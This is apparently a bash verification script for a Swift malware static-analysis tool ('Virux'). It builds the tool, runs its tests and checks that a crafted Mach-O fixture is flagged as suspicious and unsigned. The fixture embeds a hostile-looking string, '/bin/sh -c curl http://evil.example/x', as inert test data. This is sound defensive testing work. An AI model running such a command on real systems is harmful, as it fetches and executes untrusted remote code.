#!/usr/bin/env bash
# Virux M4 verification: static analysis + resource gate + coordinator.
# No VM is booted (disk-gated); safe fixtures only.
set -euo pipefail
cd "$(dirname "$0")/.."
TMP="$(mktemp -d)"
pass=0; fail=0
check() { if [ "$2" = "$3" ]; then echo "  PASS  $1 ($3)"; pass=$((pass+1));
  else echo "  FAIL  $1 (expected '$2', got '$3')"; fail=$((fail+1)); fi; }

echo "== build =="
swift build 2>&1 | grep -viE "^\[|Building|Compiling|Planning|Pre-planning|Provisioning|^$" | tail -2

echo "== unit tests =="
swift test 2>&1 | grep -E "Executed [0-9]+ tests" | tail -4 | sed 's/^/  /' || true

echo "== static analysis: real system binary =="
.build/debug/virux analyze /bin/ls | sed 's/^/  /' || true

echo "== static analysis: suspicious fixture (unsigned + shell strings) =="
python3 - "$TMP/sample" <<'PY'
import struct, sys
d = struct.pack('<IIIIIIII', 0xFEEDFACF, 0x0100000C, 0, 2, 0, 0, 0, 0)
d += b'run /bin/sh -c curl http://evil.example/x'
open(sys.argv[1], 'wb').write(d)
PY
OUT="$(.build/debug/virux analyze "$TMP/sample")"
echo "$OUT" | sed 's/^/  /'
echo "$OUT" | grep -q "verdict:   suspicious" && { echo "  PASS  suspicious fixture flagged"; pass=$((pass+1)); } || { echo "  FAIL  suspicious fixture"; fail=$((fail+1)); }
echo "$OUT" | grep -q "signed:    no" && { echo "  PASS  unsigned detected"; pass=$((pass+1)); } || { echo "  FAIL  unsigned detection"; fail=$((fail+1)); }

echo "== static analysis: non-Mach-O =="
printf 'hello world, not a binary' > "$TMP/text"
.build/debug/virux analyze "$TMP/text" | grep -E "mach-o|verdict" | sed 's/^/  /'

echo
echo "== summary: $pass passed, $fail failed =="
[ "$fail" = "0" ]
